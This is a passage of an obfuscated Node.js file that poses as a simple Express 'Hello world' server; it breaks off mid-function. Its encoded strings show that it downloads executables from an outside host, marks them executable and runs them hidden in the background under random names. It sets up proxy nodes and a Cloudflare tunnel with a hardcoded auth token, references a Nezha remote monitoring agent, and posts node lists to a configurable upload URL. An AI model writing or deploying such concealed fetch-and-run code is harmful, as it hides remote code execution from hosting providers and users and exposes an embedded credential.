const _0x3d7aff = _0xec37;
(function (_0x88ac12, _0x2bbae9) {
    const _0x2c63b0 = _0xec37;
    const _0xf044a6 = _0x88ac12();
    while (!![]) {
        try {
            const _0x59542f = parseInt(_0x2c63b0(0x24f)) / 0x1 * (-parseInt(_0x2c63b0(0x292)) / 0x2) + parseInt(_0x2c63b0(0x1b3)) / 0x3 + -parseInt(_0x2c63b0(0x218)) / 0x4 * (parseInt(_0x2c63b0(0x23c)) / 0x5) + -parseInt(_0x2c63b0(0x284)) / 0x6 * (parseInt(_0x2c63b0(0x2b8)) / 0x7) + parseInt(_0x2c63b0(0x24a)) / 0x8 + parseInt(_0x2c63b0(0x23e)) / 0x9 + -parseInt(_0x2c63b0(0x263)) / 0xa;
            if (_0x59542f === _0x2bbae9) {
                break;
            } else {
                _0xf044a6['push'](_0xf044a6['shift']());
            }
        } catch (_0x17bd42) {
            _0xf044a6['push'](_0xf044a6['shift']());
        }
    }
}(_0x41e6, 0x8d7a3));
const express = require(_0x3d7aff(0x1fb));
const app = express();
function _0xec37(_0x27857c, _0x52a075) {
    const _0x41e649 = _0x41e6();
    _0xec37 = function (_0xec37bd, _0x55e44b) {
        _0xec37bd = _0xec37bd - 0x17c;
        let _0x36072d = _0x41e649[_0xec37bd];
        return _0x36072d;
    };
    return _0xec37(_0x27857c, _0x52a075);
}
const axios = require(_0x3d7aff(0x21a));
const os = require('\x6f\x73');
const fs = require('\x66\x73');
const path = require(_0x3d7aff(0x206));
const {promisify} = require('\x75\x74\x69\x6c');
const exec = promisify(require('\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63' + _0x3d7aff(0x25a))[_0x3d7aff(0x2a3)]);
const {execSync} = require(_0x3d7aff(0x2a0) + _0x3d7aff(0x25a));
const UPLOAD_URL = process['\x65\x6e\x76']['\x55\x50\x4c\x4f\x41\x44\x5f\x55\x52\x4c'] || '';
const PROJECT_URL = process['\x65\x6e\x76'][_0x3d7aff(0x23b) + '\x4c'] || '';
const AUTO_ACCESS = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1ae) + '\x53'] || ![];
const FILE_PATH = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1ce)] || '\x2e\x2f\x74\x6d\x70';
const SUB_PATH = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x233)] || _0x3d7aff(0x186) + _0x3d7aff(0x1af) + _0x3d7aff(0x1f4) + '\x34\x36\x38\x64\x62\x33';
const PORT = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x27b) + '\x54'] || process['\x65\x6e\x76']['\x50\x4f\x52\x54'] || 0xbb8;
const UUID = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1de)] || _0x3d7aff(0x186) + _0x3d7aff(0x1af) + _0x3d7aff(0x1f4) + _0x3d7aff(0x20c);
const NEZHA_SERVER = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1c4) + '\x45\x52'] || '';
const NEZHA_PORT = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x25c)] || '';
const NEZHA_KEY = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1e9)] || '';
const ARGO_DOMAIN = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x225) + '\x4e'] || _0x3d7aff(0x27f) + '\x64\x66\x71\x2e\x64\x70\x64\x6e\x73\x2e' + _0x3d7aff(0x285);
const ARGO_AUTH = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x2a6)] || _0x3d7aff(0x29e) + '\x67\x79\x4e\x6a\x4d\x34\x4d\x32\x59\x79' + _0x3d7aff(0x268) + _0x3d7aff(0x1bf) + _0x3d7aff(0x1e5) + _0x3d7aff(0x2c1) + _0x3d7aff(0x28b) + _0x3d7aff(0x187) + _0x3d7aff(0x235) + '\x51\x74\x4f\x47\x52\x69\x5a\x44\x67\x34' + _0x3d7aff(0x1ba) + '\x77\x69\x63\x79\x49\x36\x49\x6b\x31\x45' + _0x3d7aff(0x1c8) + _0x3d7aff(0x18f) + _0x3d7aff(0x1b9) + '\x78\x55\x61\x47\x6c\x4e\x4d\x6c\x46\x30' + _0x3d7aff(0x266) + _0x3d7aff(0x245) + _0x3d7aff(0x257);
const ARGO_PORT = process[_0x3d7aff(0x2aa)]['\x41\x52\x47\x4f\x5f\x50\x4f\x52\x54'] || 0x682d;
const CFIP = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x1df)] || '\x77\x77\x77\x2e\x76\x69\x73\x61\x2e\x63' + '\x6e';
const CFPORT = process[_0x3d7aff(0x2aa)][_0x3d7aff(0x193)] || 0x1bb;
function _0x41e6() {
    const _0x169fe0 = [
        '\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61\x6d',
        '\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31',
        '\x6c\x3a\x20\x68\x74\x74\x70\x32\x0a\x20',
        '\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6c',
        '\x24\x31\x38\x7d\x27\x20\x7c\x20\x73\x65',
        '\x38\x33\x36\x36\x38\x39\x30\x45\x48\x65\x70\x66\x4c',
        '\x73\x75\x62\x2e\x74\x78\x74',
        '\x75\x74\x69\x6e\x67\x20\x63\x6f\x6d\x6d',
        '\x54\x31\x52\x4b\x62\x55\x31\x58\x57\x6d',
        '\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63',
        '\x5a\x47\x59\x35\x4d\x6a\x4d\x34\x4e\x6d',
        '\x74\x63\x70',
        '\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72',
        '\x72\x65\x73\x70\x6f\x6e\x73\x65',
        '\x20\x69\x6e\x66\x6f\x20\x2d\x2d\x75\x72',
        '\x71\x75\x69\x63',
        '\x64\x69\x73\x61\x62\x6c\x65\x5f\x63\x6f',
        '\x6c\x6f\x61\x64\x69\x6e\x67\x20\x66\x69',
        '\x61\x76\x65\x64\x20\x73\x75\x63\x63\x65',
        '\x61\x74\x65\x3a\x20\x74\x72\x75\x65\x0a',
        '\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67',
        '\x73\x74\x72\x65\x61\x6d',
        '\x2f\x61\x70\x69\x2f\x61\x64\x64\x2d\x6e',
        '\x79\x63\x2e\x6d\x6e\x2f\x76\x31',
        '\x2d\x61\x75\x74\x6f\x2d\x75\x70\x64\x61',
        '\x70\x65\x65\x64\x2e\x63\x6c\x6f\x75\x64',
        '\x75\x74\x66\x2d\x38',
        '\x20\x69\x73\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x63\x72\x65\x74\x3a\x20',
        '\x53\x45\x52\x56\x45\x52\x5f\x50\x4f\x52',
        '\x70\x74\x79\x2c\x73\x6b\x69\x70\x20\x72',
        '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e',
        '\x0a\x73\x6b\x69\x70\x5f\x63\x6f\x6e\x6e',
        '\x72\x61\x69\x6c\x77\x61\x79\x2e\x61\x73',
        '\x71\x75\x65\x72\x79\x3a\x20\x66\x61\x6c',
        '\x64\x3a\x20',
        '\x74\x65\x20\x2d\x2d\x72\x65\x70\x6f\x72',
        '\x61\x6d\x64',
        '\x36\x73\x49\x5a\x72\x70\x59',
        '\x6f\x72\x67',
        '\x6e\x3d\x6e\x6f\x6e\x65\x26\x73\x65\x63',
        '\x0a\x75\x73\x65\x5f\x67\x69\x74\x65\x65',
        '\x6e\x69\x6e\x67',
        '\x6f\x62\x74\x61\x69\x6e\x20\x41\x72\x67',
        '\x6a\x6f\x69\x6e',
        '\x4f\x57\x5a\x6d\x59\x54\x64\x6d\x4d\x7a',
        '\x66\x6f\x72\x45\x61\x63\x68',
        '\x61\x61\x72\x63\x68\x36\x34',
        '\x66\x6f\x72\x20',
        '\x6f\x6e\x20\x75\x70\x6c\x6f\x61\x64\x65',
        '\x74\x2d\x64\x65\x6c\x61\x79\x20\x34\x20',
        '\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75',
        '\x31\x39\x35\x36\x33\x38\x76\x4a\x70\x67\x75\x46',
        '\x70\x6b\x69\x6c\x6c\x20\x2d\x66\x20\x22',
        '\x74\x6c\x73\x26\x73\x6e\x69\x3d',
        '\x20\x2d\x63\x20',
        '\x75\x6c\x6c\x79',
        '\x20\x74\x61\x73\x6b\x20\x66\x61\x69\x6c',
        '\x61\x63\x63\x65\x73\x73\x20\x74\x61\x73',
        '\x69\x6e\x74\x20\x24\x32\x36\x22\x2d\x22',
        '\x66\x20\x2f\x69\x6d\x20',
        '\x66\x69\x6c\x65\x4e\x61\x6d\x65',
        '\x73\x65\x6e\x64',
        '\x0a\x64\x65\x62\x75\x67\x3a\x20\x66\x61',
        '\x65\x79\x4a\x68\x49\x6a\x6f\x69\x5a\x54',
        '\x77\x65\x62\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63',
        '\x4e\x6f\x64\x65\x73\x20\x75\x70\x6c\x6f',
        '\x76\x6c\x65\x73\x73',
        '\x65\x78\x65\x63',
        '\x62\x6c\x61\x63\x6b\x68\x6f\x6c\x65',
        '\x6e\x74\x3a\x20\x74\x72\x75\x65\x0a\x73',
        '\x41\x52\x47\x4f\x5f\x41\x55\x54\x48',
        '\x72\x74\x5f\x64\x65\x6c\x61\x79\x3a\x20',
        '\x4e\x45\x5a\x48\x41\x20\x76\x61\x72\x69',
        '\x0a\x20\x20\x74\x75\x6e\x6e\x65\x6c\x3a',
        '\x65\x6e\x76',
        '\x66\x72\x6f\x6d',
        '\x6c\x69\x73\x74\x2e\x74\x78\x74',
        '\x20\x2d\x2d\x64\x69\x73\x61\x62\x6c\x65',
        '\x67\x20\x65\x72\x72\x6f\x72\x3a\x20',
        '\x74\x75\x6e\x6e\x65\x6c\x20\x2d\x2d\x65',
        '\x69\x64\x3a\x20',
        '\x0a\x63\x6c\x69\x65\x6e\x74\x5f\x73\x65',
        '\x64\x61\x74\x61',
        '\x64\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e',
        '\x26\x66\x70\x3d\x66\x69\x72\x65\x66\x6f',
        '\x6e\x67\x20\x6f\x6e\x20\x70\x6f\x72\x74',
        '\x6c\x65\x20',
        '\x78\x69\x73\x74\x73',
        '\x33\x31\x39\x30\x39\x32\x32\x4d\x44\x44\x44\x4a\x73',
        '\x73\x74\x72\x69\x6e\x67\x69\x66\x79',
        '\x36\x30\x23',
        '\x45\x72\x72\x6f\x72\x20\x65\x78\x65\x63',
        '\x73\x74\x61\x74\x75\x73',
        '\x61\x64\x65\x64\x20\x73\x75\x63\x63\x65',
        '\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x6f',
        '\x38\x34\x34\x33',
        '\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73',
        '\x45\x69\x4c\x43\x4a\x30\x49\x6a\x6f\x69',
        '\x53\x75\x62\x73\x63\x72\x69\x70\x74\x69',
        '\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26',
        '\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31',
        '\x63\x68\x6d\x6f\x64',
        '\x6c\x65\x73\x73\x2d\x61\x72\x67\x6f\x25',
        '\x73\x65\x5f\x69\x70\x76\x36\x5f\x63\x6f',
        '\x69\x6e\x67\x20\x62\x6f\x6f\x74\x2e\x6c',
        '\x72\x6f\x6a\x61\x6e\x2d\x61\x72\x67\x6f',
        '\x63\x6c\x65\x61\x72',
        '\x2f\x61\x70\x69\x2f\x61\x64\x64\x2d\x73',
        '\x45\x6d\x70\x6f\x77\x65\x72\x6d\x65\x6e',
        '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72',
        '\x63\x6f\x75\x6e\x74\x3a\x20\x74\x72\x75',
        '\x66\x6c\x61\x72\x65\x2e\x63\x6f\x6d\x2f',
        '\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c',
        '\x2f\x73\x75\x62\x2e\x74\x78\x74\x20\x73',
        '\x61\x6e\x64\x3a\x20',
        '\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6f',
        '\x6f\x74\x6f\x63\x6f\x6c\x20\x68\x74\x74',
        '\x73\x6e\x69\x3d',
        '\x70\x75\x73\x68',
        '\x66\x62\x35\x37\x63\x32\x66\x36\x2d\x31',
        '\x41\x74\x4e\x6a\x59\x33\x59\x53\x30\x30',
        '\x78\x26\x74\x79\x70\x65\x3d\x77\x73\x26',
        '\x73\x73\x20\x74\x61\x73\x6b',
        '\x65\x72\x72\x6f\x72',
        '\x20\x66\x61\x69\x6c\x65\x64\x3a\x20',
        '\x73\x65\x0a\x67\x70\x75\x3a\x20\x66\x61',
        '\x4e\x20\x6f\x72\x20\x41\x52\x47\x4f\x5f',
        '\x2f\x76\x6c\x65\x73\x73\x2d\x61\x72\x67',
        '\x52\x6e\x64\x46\x70\x74\x54\x54\x56\x4f',
        '\x6e\x20\x63\x6f\x6e\x6e\x65\x63\x74\x20',
        '\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x20',
        '\x79\x3a\x20\x74\x72\x75\x65\x0a\x20\x20',
        '\x43\x46\x50\x4f\x52\x54',
        '\x62\x6c\x65\x20\x69\x73\x20\x65\x6d\x70',
        '\x5f\x74\x6f\x5f\x75\x70\x67\x72\x61\x64',
        '\x0a\x20\x20\x20\x20\x20\x20\x73\x65\x72',
        '\x73\x75\x62\x73\x74\x72\x69\x6e\x67',
        '\x76\x6d\x65\x73\x73',
        '\x79\x63\x2e\x6d\x6e\x2f\x77\x65\x62',
        '\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c',
        '\x6d\x6c\x22\x20\x3e\x2f\x64\x65\x76\x2f',
        '\x74\x61\x72\x74\x73\x65\x72\x76\x65\x72',
        '\x72\x65\x5f\x74\x6c\x73\x3a\x20\x74\x72',
        '\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d',
        '\x62\x61\x73\x65\x36\x34',
        '\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61',
        '\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73',
        '\x72\x6f\x63\x73\x20\x3e\x2f\x64\x65\x76',
        '\x73\x74\x61\x74\x53\x79\x6e\x63',
        '\x6c\x65\x6e\x67\x74\x68',
        '\x6e\x6f\x68\x75\x70\x20',
        '\x61\x72\x6d\x36\x34',
        '\x66\x6f\x72\x20\x75\x73\x69\x6e\x67\x20',
        '\x65\x3a\x20\x68\x74\x74\x70\x5f\x73\x74',
        '\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c',
        '\x6e\x20\x2d\x2d\x73\x6b\x69\x70\x2d\x70',
        '\x6d\x65\x73\x73\x61\x67\x65',
        '\x6e\x70\x6d\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x0a\x20\x20\x70\x72\x6f\x74\x6f\x63\x6f',
        '\x41\x55\x54\x4f\x5f\x41\x43\x43\x45\x53',
        '\x66\x63\x33\x2d\x34\x36\x33\x65\x2d\x38',
        '\x61\x62\x6c\x65\x20\x69\x73\x20\x65\x6d',
        '\x73\x70\x6c\x69\x74',
        '\x74\x20\x73\x75\x63\x63\x65\x73\x73\x20',
        '\x32\x30\x38\x37\x35\x30\x38\x44\x62\x47\x6f\x4a\x4d',
        '\x34\x0a\x73\x65\x72\x76\x65\x72\x3a\x20',
        '\x20\x0a\x20\x20\x69\x6e\x67\x72\x65\x73',
        '\x69\x61\x6c\x73\x2d\x66\x69\x6c\x65\x3a',
        '\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20',
        '\x41\x70\x70\x20\x69\x73\x20\x72\x75\x6e',
        '\x61\x54\x41\x77\x54\x57\x31\x4a\x65\x55',
        '\x4d\x54\x6b\x7a\x4d\x6a\x42\x68\x49\x69',
        '\x63\x61\x74\x63\x68',
        '\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63',
        '\x68\x61\x73',
        '\x74\x6f\x20\x74\x75\x6e\x6e\x65\x6c',
        '\x45\x34\x5a\x44\x4e\x68\x4d\x6a\x63\x31',
        '\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a',
        '\x66\x61\x6c\x73\x65',
        '\x20\x2d\x46\x5c\x22\x20\x27\x7b\x70\x72',
        '\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a',
        '\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56',
        '\x65\x63\x74\x75\x72\x65',
        '\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x20',
        '\x0a\x20\x20\x20\x20\x20\x20\x6f\x72\x69',
        '\x57\x6d\x70\x4f\x52\x46\x5a\x73\x57\x56',
        '\x61\x72\x6d',
        '\x74\x65\x73\x74',
        '\x32\x30\x39\x36',
        '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f',
        '\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74',
        '\x46\x49\x4c\x45\x5f\x50\x41\x54\x48',
        '\x75\x6e\x6c\x69\x6e\x6b',
        '\x3a\x20\x66\x61\x6c\x73\x65\x0a\x75\x75',
        '\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53',
        '\x65\x5f\x61\x75\x74\x6f\x5f\x75\x70\x64',
        '\x61\x72\x63\x68',
        '\x6f\x44\x6f\x6d\x61\x69\x6e',
        '\x77\x69\x6e\x33\x32',
        '\x34\x34\x33',
        '\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e',
        '\x20\x20\x2d\x20\x73\x65\x72\x76\x69\x63',
        '\x6f\x3f\x65\x64\x3d\x32\x35\x36\x30',
        '\x0a\x64\x69\x73\x61\x62\x6c\x65\x5f\x66',
        '\x20\x32\x3e\x26\x31',
        '\x3f\x73\x65\x63\x75\x72\x69\x74\x79\x3d',
        '\x6e\x6f\x54\x4c\x53\x56\x65\x72\x69\x66',
        '\x55\x55\x49\x44',
        '\x43\x46\x49\x50',
        '\x69\x6e\x63\x6c\x75\x64\x65\x73',
        '\x65\x63\x74\x69\x6f\x6e\x5f\x63\x6f\x75',
        '\x67\x65\x74',
        '\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66',
        '\x65\x3a\x20\x74\x72\x75\x65\x0a\x64\x69',
        '\x59\x57\x59\x31\x4d\x7a\x51\x35\x4e\x57',
        '\x61\x75\x74\x6f\x6d\x61\x74\x69\x63\x20',
        '\x70\x6f\x73\x74',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72',
        '\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59',
        '\x74\x68\x69\x73\x20\x73\x63\x72\x69\x70',
        '\x79\x6e\x63',
        '\x69\x73\x46\x69\x6c\x65',
        '\x2f\x61\x70\x69\x2f\x64\x65\x6c\x65\x74',
        '\x45\x72\x72\x6f\x72\x20\x64\x6f\x77\x6e',
        '\x41\x72\x67\x6f\x44\x6f\x6d\x61\x69\x6e',
        '\x75\x72\x65\x3a\x20\x66\x61\x6c\x73\x65',
        '\x74\x2c\x20\x65\x6e\x6a\x6f\x79\x21',
        '\x70\x68\x70\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x74\x6c\x73',
        '\x61\x33\x61\x2d\x36\x64\x32\x31\x31\x30',
        '\x72\x20\x69\x73\x20\x72\x75\x6e\x6e\x69',
        '\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64',
        '\x70\x32\x20\x2d\x2d\x6c\x6f\x67\x66\x69',
        '\x20\x3e\x20\x6e\x75\x6c\x20\x32\x3e\x26',
        '\x66\x69\x6c\x65\x55\x72\x6c',
        '\x68\x6f\x73\x74\x3d',
        '\x65\x78\x70\x72\x65\x73\x73',
        '\x6c\x69\x73\x74\x65\x6e',
        '\x6d\x69\x73\x6d\x61\x74\x63\x68\x20\x54',
        '\x6c\x73\x65\x0a\x64\x69\x73\x61\x62\x6c',
        '\x6f\x73\x74\x6e\x61\x6d\x65\x3a\x20',
        '\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63',
        '\x20\x2d\x63\x20\x22',
        '\x6e\x6f\x6e\x65',
        '\x73\x69\x6f\x6e\x20\x61\x75\x74\x6f\x20',
        '\x20\x2d\x70\x20',
        '\x75\x65\x0a\x69\x70\x5f\x72\x65\x70\x6f',
        '\x70\x61\x74\x68',
        '\x6c\x6f\x67',
        '\x2d\x2d\x6e\x6f\x2d\x61\x75\x74\x6f\x75',
        '\x68\x74\x74\x70\x20\x73\x65\x72\x76\x65',
        '\x0a\x20\x20\x20\x20',
        '\x65\x72\x72\x6f\x72\x20\x69\x6e\x20\x73',
        '\x34\x36\x38\x64\x62\x33',
        '\x74\x75\x6e\x6e\x65\x6c\x2e\x6a\x73\x6f',
        '\x74\x72\x69\x6d',
        '\x6a\x75\x73\x74',
        '\x3f\x65\x6e\x63\x72\x79\x70\x74\x69\x6f',
        '\x32\x30\x35\x33',
        '\x62\x6f\x6f\x74\x2e\x6c\x6f\x67',
        '\x33\x46\x65\x64\x25\x33\x44\x32\x35\x36',
        '\x74\x2c\x75\x73\x65\x20\x74\x6f\x6b\x65',
        '\x6e\x65\x74\x2f\x61\x64\x64\x2d\x75\x72',
        '\x22\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d',
        '\x36\x31\x37\x31\x32\x30\x6c\x78\x7a\x49\x67\x78',
        '\x75\x72\x69\x74\x79\x3d\x74\x6c\x73\x26',
        '\x61\x78\x69\x6f\x73',
        '\x6c\x6c\x79',
        '\x65\x53\x74\x72\x65\x61\x6d',
        '\x62\x6c\x6f\x63\x6b',
        '\x63\x6c\x6f\x73\x65',
        '\x70\x32\x20\x72\x75\x6e\x20\x2d\x2d\x74',
        '\x2d\x2d\x74\x6c\x73',
        '\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79',
        '\x79\x63\x2e\x6d\x6e\x2f\x61\x67\x65\x6e',
        '\x2d\x2d\x63\x6f\x6e\x66\x69\x67\x20',
        '\x6d\x61\x74\x63\x68',
        '\x41\x52\x47\x4f\x5f\x44\x4f\x4d\x41\x49',
        '\x66\x72\x65\x65\x64\x6f\x6d',
        '\x69\x63\x6b\x20\x74\x75\x6e\x6e\x65\x6c',
        '\x68\x74\x74\x70\x73\x2b\x6c\x6f\x63\x61',
        '\x4e\x41\x4d\x45',
        '\x6f\x6f\x2e\x73\x65\x72\x76\x30\x30\x2e',
        '\x75\x6c\x6c\x20\x32\x3e\x26\x31',
        '\x64\x20\x2d\x65\x20\x27\x73\x2f\x20\x2f',
        '\x66\x69\x72\x65\x66\x6f\x78',
        '\x65\x2d\x6e\x6f\x64\x65\x73',
        '\x0a\x20\x20\x0a\x74\x72\x6f\x6a\x61\x6e',
        '\x75\x6e\x73\x68\x69\x66\x74',
        '\x2c\x20\x72\x65\x2d\x72\x75\x6e\x6e\x69',
        '\x75\x6e\x74\x72\x79\x5f\x63\x6f\x64\x65',
        '\x53\x55\x42\x5f\x50\x41\x54\x48',
        '\x6e\x2f\x6a\x73\x6f\x6e',
        '\x4d\x7a\x42\x68\x4c\x57\x45\x77\x4d\x54',
        '\x6b\x69\x70\x5f\x70\x72\x6f\x63\x73\x5f',
        '\x74\x6f\x53\x74\x72\x69\x6e\x67',
        '\x72\x74\x5f\x70\x65\x72\x69\x6f\x64\x3a',
        '\x2f\x62\x6f\x6f\x74\x2e\x6c\x6f\x67\x20',
        '\x2e\x65\x78\x65\x20\x3e\x20\x6e\x75\x6c',
        '\x50\x52\x4f\x4a\x45\x43\x54\x5f\x55\x52',
        '\x35\x49\x77\x46\x6c\x41\x56',
        '\x66\x69\x6e\x69\x73\x68',
        '\x33\x36\x34\x37\x33\x36\x37\x44\x73\x52\x65\x45\x67',
        '\x63\x68\x61\x72\x41\x74',
        '\x54\x75\x6e\x6e\x65\x6c\x53\x65\x63\x72',
        '\x6f\x6e\x20\x3e\x2f\x64\x65\x76\x2f\x6e',
        '\x73\x73\x66\x75\x6c\x6c\x79',
        '\x73\x61\x62\x6c\x65\x5f\x6e\x61\x74\x3a',
        '\x41\x52\x47\x4f\x5f\x41\x55\x54\x48\x20',
        '\x68\x4f\x52\x46\x4a\x72\x57\x6b\x52\x6b',
        '\x73\x3a\x0a\x20\x20\x20\x20\x2d\x20\x68',
        '\x70\x6c\x61\x74\x66\x6f\x72\x6d',
        '\x5f\x2f\x67\x27',
        '\x6f\x72\x20',
        '\x38\x31\x38\x34\x32\x30\x38\x72\x76\x73\x4d\x49\x73',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x6f',
        '\x6c\x20\x32\x3e\x26\x31\x20\x26',
        '\x6e\x67\x20\x62\x6f\x74\x20\x74\x6f\x20',
        '\x6f\x64\x65\x73',
        '\x31\x4e\x64\x7a\x4a\x77\x74',
        '\x62\x61\x73\x65\x6e\x61\x6d\x65',
        '\x65\x6e\x74\x20\x61\x72\x63\x68\x69\x74',
        '\x75\x6e\x6e\x69\x6e\x67',
        '\x68\x74\x74\x70',
        '\x61\x6c\x6c',
        '\x79\x63\x2e\x6d\x6e\x2f\x62\x6f\x74',
        '\x61\x62\x6c\x65\x5f\x73\x65\x6e\x64\x5f',
        '\x62\x53\x4a\x39',
        '\x41\x64\x64\x20\x61\x75\x74\x6f\x6d\x61',
        '\x74\x20\x66\x61\x69\x6c\x65\x64\x20\x66',
        '\x65\x73\x73',
        '\x74\x69\x63\x20\x61\x63\x63\x65\x73\x73',
        '\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54',
        '\x75\x6e\x6e\x65\x6c\x53\x65\x63\x72\x65'
    ];
    _0x41e6 = function () {
        return _0x169fe0;
    };
    return _0x41e6();
}
const NAME = process['\x65\x6e\x76'][_0x3d7aff(0x229)] || _0x3d7aff(0x20f);
if (!fs[_0x3d7aff(0x267)](FILE_PATH)) {
    fs[_0x3d7aff(0x1bc)](FILE_PATH);
    console['\x6c\x6f\x67'](FILE_PATH + ('\x20\x69\x73\x20\x63\x72\x65\x61\x74\x65' + '\x64'));
} else {
    console[_0x3d7aff(0x207)](FILE_PATH + ('\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65' + _0x3d7aff(0x2b7)));
}
function generateRandomName() {
    const _0x118f17 = _0x3d7aff;
    const _0x3017a7 = _0x118f17(0x1c0) + _0x118f17(0x1cd) + '\x75\x76\x77\x78\x79\x7a';
    let _0x599589 = '';
    for (let _0x5549f5 = 0x0; _0x5549f5 < 0x6; _0x5549f5++) {
        _0x599589 += _0x3017a7[_0x118f17(0x23f)](Math['\x66\x6c\x6f\x6f\x72'](Math['\x72\x61\x6e\x64\x6f\x6d']() * _0x3017a7['\x6c\x65\x6e\x67\x74\x68']));
    }
    return _0x599589;
}
const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();
let npmPath = path[_0x3d7aff(0x28a)](FILE_PATH, npmName);
let phpPath = path[_0x3d7aff(0x28a)](FILE_PATH, phpName);
let webPath = path[_0x3d7aff(0x28a)](FILE_PATH, webName);
let botPath = path[_0x3d7aff(0x28a)](FILE_PATH, botName);
let subPath = path[_0x3d7aff(0x28a)](FILE_PATH, _0x3d7aff(0x264));
let listPath = path[_0x3d7aff(0x28a)](FILE_PATH, _0x3d7aff(0x2ac));
let bootLogPath = path['\x6a\x6f\x69\x6e'](FILE_PATH, _0x3d7aff(0x212));
let configPath = path[_0x3d7aff(0x28a)](FILE_PATH, _0x3d7aff(0x2be) + '\x6e');
function deleteNodes() {
    const _0x2489af = _0x3d7aff;
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs[_0x2489af(0x267)](subPath))
            return;
        let _0x5a6eaa;
        try {
            _0x5a6eaa = fs[_0x2489af(0x221) + '\x6e\x63'](subPath, _0x2489af(0x278));
        } catch {
            return null;
        }
        const _0x44e4e6 = Buffer['\x66\x72\x6f\x6d'](_0x5a6eaa, _0x2489af(0x19f))[_0x2489af(0x237)]('\x75\x74\x66\x2d\x38');
        const _0x582115 = _0x44e4e6[_0x2489af(0x1b1)]('\x0a')['\x66\x69\x6c\x74\x65\x72'](_0x5701e9 => /(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2489af(0x1ca)](_0x5701e9));
        if (_0x582115['\x6c\x65\x6e\x67\x74\x68'] === 0x0)
            return;
        axios[_0x2489af(0x1e7)](UPLOAD_URL + (_0x2489af(0x1ed) + _0x2489af(0x22e)), JSON[_0x2489af(0x2b9)]({ '\x6e\x6f\x64\x65\x73': _0x582115 }), { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x2489af(0x1cc) + _0x2489af(0x234) } })[_0x2489af(0x1bb)](_0x1176b1 => {
            return null;
        });
        return null;
    } catch (_0x539fb3) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0x3453c0 = _0x3d7aff;
    try {
        const _0x56499f = fs['\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e' + '\x63'](FILE_PATH);
        _0x56499f[_0x3453c0(0x28c)](_0x184de3 => {
            const _0x35b280 = _0x3453c0;
            const _0x19b328 = path[_0x35b280(0x28a)](FILE_PATH, _0x184de3);
            try {
                const _0x5399fa = fs[_0x35b280(0x1a3)](_0x19b328);
                if (_0x5399fa[_0x35b280(0x1ec)]()) {
                    fs[_0x35b280(0x200)](_0x19b328);
                }
            } catch (_0x43a00b) {
            }
        });
    } catch (_0xba8518) {
    }
}
app[_0x3d7aff(0x1e2)]('\x2f', function (_0x258870, _0x228f06) {
    const _0x18066b = _0x3d7aff;
    _0x228f06[_0x18066b(0x29c)](_0x18066b(0x1a9) + '\x64\x21');
});
async function generateConfig() {
    const _0x45cfe4 = _0x3d7aff;
    const _0x5ee7ce = {
        '\x6c\x6f\x67': {
